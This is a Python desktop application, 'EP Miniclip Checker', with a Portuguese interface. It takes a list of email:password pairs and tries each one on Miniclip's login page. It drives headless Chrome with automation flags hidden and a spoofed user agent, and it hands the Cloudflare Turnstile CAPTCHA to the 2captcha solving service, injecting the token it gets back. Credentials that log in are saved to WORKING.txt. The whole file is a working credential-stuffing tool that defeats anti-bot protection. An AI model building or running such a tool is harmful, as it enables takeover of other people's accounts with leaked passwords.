import sys
import time
import os
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QTextEdit, QLabel, QFileDialog, QProgressBar,
                             QFrame, QSplitter, QSpacerItem, QSizePolicy)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QSize
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager

SITE_URL = "https://me.miniclip.com/login"
TWOCAPTCHA_API_KEY = "2CAPTCHA API KEY"
WORKING_FILE = "WORKING.txt"
ERROR_FILE = "ERROR.txt"


class StyledButton(QPushButton):
    def __init__(self, text, color="#3498db", hover_color="#2980b9"):
        super().__init__(text)
        self.color = color
        self.hover_color = hover_color
        self.setStyleSheet(f"""
            QPushButton {{
                background-color: {color};
                color: white;
                border: none;
                border-radius: 5px;
                padding: 12px;
                font-weight: bold;
                font-size: 14px;
            }}
            QPushButton:hover {{
                background-color: {hover_color};
            }}
            QPushButton:disabled {{
                background-color: #bdc3c7;
                color: #7f8c8d;
            }}
        """)
        self.setCursor(Qt.PointingHandCursor)
        self.setMinimumHeight(45)


class AccountCheckerThread(QThread):
    update_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()

    def __init__(self, accounts, api_key):
        super().__init__()
        self.accounts = accounts
        self.api_key = api_key
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        total_accounts = len(self.accounts)
        valid_count = 0
        invalid_count = 0

        with open(WORKING_FILE, 'w') as f:
            f.write("")
        with open(ERROR_FILE, 'w') as f:
            f.write("")

        for i, account in enumerate(self.accounts):
            if not self.running:
                break

            try:
                email, senha = account.strip().split(":")
                self.update_signal.emit(f"Verificando conta: {email}", "info")

                result = self.verificar_conta(email, senha, self.api_key)

                if result:
                    valid_count += 1
                    self.update_signal.emit(f"✅ Conta válida: {email}", "success")
                    with open(WORKING_FILE, 'a') as f:
                        f.write(f"{email}:{senha}\n")
                else:
                    invalid_count += 1
                    self.update_signal.emit(f"❌ Conta inválida: {email}", "error")
                    with open(ERROR_FILE, 'a') as f:
                        f.write(f"{email}:{senha}\n")
            except Exception as e:
                invalid_count += 1
                self.update_signal.emit(f"Erro ao processar conta {account}: {str(e)}", "error")
                with open(ERROR_FILE, 'a') as f:
                    f.write(f"{account}\n")

            self.progress_signal.emit(int((i + 1) / total_accounts * 100))

        summary = f"Verificação concluída.\nTotal: {total_accounts}\nVálidas: {valid_count}\nInválidas: {invalid_count}"
        self.update_signal.emit(summary, "info")
        self.update_signal.emit(f"Contas válidas salvas em {WORKING_FILE}, inválidas em {ERROR_FILE}", "info")
        self.finished_signal.emit()

    def resolver_turnstile(self, api_key, sitekey, url):
        try:
            request_url = f"https://2captcha.com/in.php?key={api_key}&method=turnstile&sitekey={sitekey}&pageurl={url}&json=1"
            response = requests.get(request_url)
            response_json = response.json()

            if response_json['status'] != 1:
                self.update_signal.emit(f"Erro ao enviar captcha: {response_json['request']}", "error")
                return None

            request_id = response_json['request']
            self.update_signal.emit(f"Captcha enviado. ID: {request_id}", "info")

            for _ in range(30):
                if not self.running:
                    return None

                time.sleep(5)
                result_url = f"https://2captcha.com/res.php?key={api_key}&action=get&id={request_id}&json=1"
                result_response = requests.get(result_url)
                result_json = result_response.json()

                if result_json['status'] == 1:
                    self.update_signal.emit("Captcha resolvido com sucesso!", "success")
                    return result_json['request']

                if result_json['request'] != 'CAPCHA_NOT_READY':
                    self.update_signal.emit(f"Erro ao resolver captcha: {result_json['request']}", "error")
                    return None

                self.update_signal.emit("Captcha ainda não resolvido, aguardando...", "info")

            self.update_signal.emit("Tempo limite excedido para resolver o captcha", "error")
            return None
        except Exception as e:
            self.update_signal.emit(f"Erro ao resolver Turnstile: {e}", "error")
            return None

    def element_has_non_empty_attribute(self, locator, attribute_name):

        def _predicate(driver):
            try:
                element = driver.find_element(*locator)
                attribute_value = element.get_attribute(attribute_name)
                return attribute_value and len(attribute_value) > 0
            except:
                return False

        return _predicate

    def verificar_conta(self, email, senha, api_key):
        start_time = time.time()
        success = False
        driver = None

        options = webdriver.ChromeOptions()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--headless")
        options.add_argument("--window-size=1920,1080")
        options.add_argument(
            "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        try:
            service = ChromeService(executable_path=ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)

            driver.get(SITE_URL)
            self.update_signal.emit(f"Acessando {SITE_URL}", "info")

            WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.NAME, "email"))
            ).send_keys(email)
            self.update_signal.emit("Email preenchido", "info")

            WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.NAME, "password"))
            ).send_keys(senha)
            self.update_signal.emit("Senha preenchida", "info")

            turnstile_div = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, "cf-turnstile"))
            )
            sitekey = turnstile_div.get_attribute("data-sitekey")
            self.update_signal.emit(f"Sitekey encontrada: {sitekey}", "info")

            current_url = driver.current_url
            self.update_signal.emit(f"URL atual: {current_url}", "info")

            turnstile_response = self.resolver_turnstile(api_key, sitekey, current_url)

            if turnstile_response:
                self.update_signal.emit(f"Token Turnstile recebido: {turnstile_response[:20]}...", "info")

                driver.execute_script(
                    f"document.querySelector('[name=\"cf-turnstile-response\"]').value = '{turnstile_response}';")
                self.update_signal.emit("Token inserido no campo", "info")

                try:
                    WebDriverWait(driver, 5).until(
                        self.element_has_non_empty_attribute((By.NAME, "cf-turnstile-response"), "value")
                    )
                    self.update_signal.emit("Token verificado no campo", "info")
                except TimeoutException:
                    self.update_signal.emit("Não foi possível verificar se o token foi inserido", "warning")

                login_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "login-btn"))
                )
                self.update_signal.emit("Botão de login encontrado, clicando...", "info")
                login_button.click()

                try:
                    WebDriverWait(driver, 15).until(
                        EC.presence_of_element_located((By.XPATH,
                                                        "//*[contains(text(), 'Logout') or contains(text(), 'logout') or @id='header-logout' or @id='logout-btn']"))
                    )
                    self.update_signal.emit("Login realizado com sucesso!", "success")
                    success = True
                except TimeoutException:
                    self.update_signal.emit("Não foi possível confirmar o login.", "error")
                    driver.save_screenshot(f"login_failed_{email}.png")
                    success = False
            else:
                self.update_signal.emit("Falha ao resolver o Turnstile.", "error")
                driver.save_screenshot(f"turnstile_failure_{email}.png")
                success = False

        except (TimeoutException, NoSuchElementException) as e:
            self.update_signal.emit(f"Erro de tempo limite ou elemento não encontrado: {e}", "error")
            if driver:
                driver.save_screenshot(f"error_page_{email}.png")
                self.update_signal.emit(f"Screenshot salvo: error_page_{email}.png", "info")
            success = False

        except Exception as e:
            self.update_signal.emit(f"Erro inesperado: {e}", "error")
            if driver:
                driver.save_screenshot(f"error_unexpected_{email}.png")
                self.update_signal.emit(f"Screenshot salvo: error_unexpected_{email}.png", "info")
            success = False

        finally:
            self.update_signal.emit(f"Tempo total de execução: {time.time() - start_time:.2f}s", "info")
            if driver:
                driver.quit()
            return success


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.thread = None
        self.dark_mode = True
        self.setDarkMode()

    def initUI(self):
        self.setWindowTitle("EP Miniclip Checker")
        self.setGeometry(100, 100, 900, 700)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        main_layout = QVBoxLayout()
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(20, 20, 20, 20)

        title_label = QLabel("EP Miniclip Checker ")
        title_label.setAlignment(Qt.AlignCenter)
        font = QFont("Arial", 18, QFont.Bold)
        title_label.setFont(font)
        main_layout.addWidget(title_label)

        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setFrameShadow(QFrame.Sunken)
        main_layout.addWidget(line)

        panel_layout = QHBoxLayout()

        control_panel = QFrame()
        control_panel.setFrameShape(QFrame.StyledPanel)
        control_panel.setMinimumWidth(300)
        control_panel.setMaximumWidth(350)

        control_layout = QVBoxLayout(control_panel)
        control_layout.setSpacing(15)

        icon_label = QLabel()
        icon_label.setAlignment(Qt.AlignCenter)
        control_layout.addWidget(icon_label)

        instructions = QLabel("Selecione um arquivo .txt com contas no formato email:senha")
        instructions.setWordWrap(True)
        instructions.setAlignment(Qt.AlignCenter)
        control_layout.addWidget(instructions)

        self.select_file_btn = StyledButton("Selecionar arquivo de contas")
        self.select_file_btn.clicked.connect(self.select_file)
        control_layout.addWidget(self.select_file_btn)

        self.file_label = QLabel("Nenhum arquivo selecionado")
        self.file_label.setAlignment(Qt.AlignCenter)
        self.file_label.setWordWrap(True)
        control_layout.addWidget(self.file_label)

        self.stats_frame = QFrame()
        self.stats_frame.setFrameShape(QFrame.StyledPanel)
        stats_layout = QVBoxLayout(self.stats_frame)

        self.total_label = QLabel("Total: 0")
        self.valid_label = QLabel("Válidas: 0")
        self.invalid_label = QLabel("Inválidas: 0")

        stats_layout.addWidget(self.total_label)
        stats_layout.addWidget(self.valid_label)
        stats_layout.addWidget(self.invalid_label)

        control_layout.addWidget(self.stats_frame)

        self.progress_frame = QFrame()
        progress_layout = QVBoxLayout(self.progress_frame)

        progress_label = QLabel("Progresso:")
        progress_layout.addWidget(progress_label)

        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setAlignment(Qt.AlignCenter)
        self.progress_bar.setMinimumHeight(25)
        progress_layout.addWidget(self.progress_bar)

        control_layout.addWidget(self.progress_frame)

        button_layout = QHBoxLayout()

        self.start_btn = StyledButton("Iniciar verificação", "#27ae60", "#2ecc71")
        self.start_btn.clicked.connect(self.start_checking)
        self.start_btn.setEnabled(False)
        button_layout.addWidget(self.start_btn)

        self.stop_btn = StyledButton("Parar verificação", "#e74c3c", "#c0392b")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        button_layout.addWidget(self.stop_btn)

        control_layout.addLayout(button_layout)

        self.theme_btn = StyledButton("Alternar Tema", "#9b59b6", "#8e44ad")
        self.theme_btn.clicked.connect(self.toggle_theme)
        control_layout.addWidget(self.theme_btn)

        control_layout.addItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))

        log_panel = QFrame()
        log_panel.setFrameShape(QFrame.StyledPanel)

        log_layout = QVBoxLayout(log_panel)

        log_header = QLabel("Log de Verificação")
        log_header.setAlignment(Qt.AlignCenter)
        log_header.setFont(QFont("Arial", 12, QFont.Bold))
        log_layout.addWidget(log_header)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)

        panel_layout.addWidget(control_panel)
        panel_layout.addWidget(log_panel)

        main_layout.addLayout(panel_layout)

        central_widget.setLayout(main_layout)

    def setDarkMode(self):
        if self.dark_mode:
            palette = QPalette()
            palette.setColor(QPalette.Window, QColor(53, 53, 53))
            palette.setColor(QPalette.WindowText, Qt.white)
            palette.setColor(QPalette.Base, QColor(35, 35, 35))
            palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
            palette.setColor(QPalette.ToolTipBase, QColor(25, 25, 25))
            palette.setColor(QPalette.ToolTipText, Qt.white)
            palette.setColor(QPalette.Text, Qt.white)
            palette.setColor(QPalette.Button, QColor(53, 53, 53))
            palette.setColor(QPalette.ButtonText, Qt.white)
            palette.setColor(QPalette.BrightText, Qt.red)
            palette.setColor(QPalette.Link, QColor(42, 130, 218))
            palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
            palette.setColor(QPalette.HighlightedText, Qt.black)
            self.setPalette(palette)

            self.log_text.setStyleSheet("""
                QTextEdit {
                    background-color: #2d2d2d;
                    color: #ffffff;
                    border: 1px solid #555555;
                    border-radius: 5px;
                    padding: 5px;
                }
            """)

            for frame in [self.stats_frame, self.progress_frame]:
                frame.setStyleSheet("""
                    QFrame {
                        background-color: #2d2d2d;
                        border: 1px solid #555555;
                        border-radius: 5px;
                        padding: 10px;
                    }
                """)
        else:
            palette = QPalette()
            palette.setColor(QPalette.Window, QColor(240, 240, 240))
            palette.setColor(QPalette.WindowText, Qt.black)
            palette.setColor(QPalette.Base, Qt.white)
            palette.setColor(QPalette.AlternateBase, QColor(245, 245, 245))
            palette.setColor(QPalette.ToolTipBase, Qt.white)
            palette.setColor(QPalette.ToolTipText, Qt.black)
            palette.setColor(QPalette.Text, Qt.black)
            palette.setColor(QPalette.Button, QColor(240, 240, 240))
            palette.setColor(QPalette.ButtonText, Qt.black)
            palette.setColor(QPalette.BrightText, Qt.red)
            palette.setColor(QPalette.Link, QColor(0, 0, 255))
            palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
            palette.setColor(QPalette.HighlightedText, Qt.white)
            self.setPalette(palette)

            self.log_text.setStyleSheet("""
                QTextEdit {
                    background-color: #ffffff;
                    color: #000000;
                    border: 1px solid #cccccc;
                    border-radius: 5px;
                    padding: 5px;
                }
            """)

            for frame in [self.stats_frame, self.progress_frame]:
                frame.setStyleSheet("""
                    QFrame {
                        background-color: #f5f5f5;
                        border: 1px solid #cccccc;
                        border-radius: 5px;
                        padding: 10px;
                    }
                """)

    def toggle_theme(self):
        self.dark_mode = not self.dark_mode
        self.setDarkMode()

    def select_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Selecionar arquivo de contas", "", "Text Files (*.txt)")
        if file_name:
            self.file_label.setText(f"Arquivo: {os.path.basename(file_name)}")
            self.selected_file = file_name
            self.start_btn.setEnabled(True)

            try:
                with open(file_name, 'r', encoding='utf-8', errors='replace') as f:
                    accounts = [line.strip() for line in f.readlines() if line.strip()]

                valid_accounts = [acc for acc in accounts if ":" in acc]

                self.total_label.setText(f"Total: {len(valid_accounts)}")
                self.valid_label.setText("Válidas: 0")
                self.invalid_label.setText("Inválidas: 0")

                preview = '\n'.join(valid_accounts[:5])
                if len(valid_accounts) > 5:
                    preview += f"\n... e mais {len(valid_accounts) - 5} contas"

                self.log(f"Arquivo carregado com {len(valid_accounts)} contas.\nPreview:\n{preview}", "info")
            except Exception as e:
                self.log(f"Erro ao ler arquivo: {str(e)}", "error")

    def start_checking(self):
        if not hasattr(self, 'selected_file') or not os.path.exists(self.selected_file):
            self.log("Selecione um arquivo válido primeiro", "error")
            return

        try:
            with open(self.selected_file, 'r') as f:
                accounts = [line.strip() for line in f.readlines() if ":" in line.strip()]

            if not accounts:
                self.log("Nenhuma conta válida encontrada no arquivo", "error")
                return

            self.log(f"Iniciando verificação de {len(accounts)} contas...", "info")
            self.progress_bar.setValue(0)

            self.total_label.setText(f"Total: {len(accounts)}")
            self.valid_label.setText("Válidas: 0")
            self.invalid_label.setText("Inválidas: 0")

            self.start_btn.setEnabled(False)
            self.select_file_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)

            self.thread = AccountCheckerThread(accounts, TWOCAPTCHA_API_KEY)
            self.thread.update_signal.connect(self.log)
            self.thread.progress_signal.connect(self.update_progress)
            self.thread.finished_signal.connect(self.checking_finished)
            self.thread.start()

        except Exception as e:
            self.log(f"Erro ao iniciar verificação: {str(e)}", "error")

    def stop_checking(self):
        if self.thread and self.thread.isRunning():
            self.log("Parando verificação...", "info")
            self.thread.stop()
            self.thread.wait()
            self.log("Verificação interrompida.", "info")
            self.checking_finished()

    def checking_finished(self):
        self.start_btn.setEnabled(True)
        self.select_file_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        try:
            working_count = 0
            error_count = 0

            if os.path.exists(WORKING_FILE):
                with open(WORKING_FILE, 'r') as f:
                    working_count = len([line for line in f.readlines() if line.strip()])

            if os.path.exists(ERROR_FILE):
                with open(ERROR_FILE, 'r') as f:
                    error_count = len([line for line in f.readlines() if line.strip()])

            self.valid_label.setText(f"Válidas: {working_count}")
            self.invalid_label.setText(f"Inválidas: {error_count}")
        except Exception as e:
            self.log(f"Erro ao atualizar estatísticas: {str(e)}", "error")

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def log(self, message, msg_type="info"):
        timestamp = time.strftime("%H:%M:%S")

        if msg_type == "success":
            color = "#27ae60"
            prefix = "✅ "
        elif msg_type == "error":
            color = "#e74c3c"
            prefix = "❌ "
        elif msg_type == "warning":
            color = "#f39c12"
            prefix = "⚠️ "
        else:
            color = "#3498db"
            prefix = "ℹ️ "

        if "Conta válida" in message:
            current_count = int(self.valid_label.text().split(": ")[1])
            self.valid_label.setText(f"Válidas: {current_count + 1}")
        elif "Conta inválida" in message:
            current_count = int(self.invalid_label.text().split(": ")[1])
            self.invalid_label.setText(f"Inválidas: {current_count + 1}")

        formatted_message = f"<span style='color:{color};'>[{timestamp}] {prefix}{message}</span>"
        self.log_text.append(formatted_message)
        self.log_text.verticalScrollBar().setValue(self.log_text.verticalScrollBar().maximum())


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
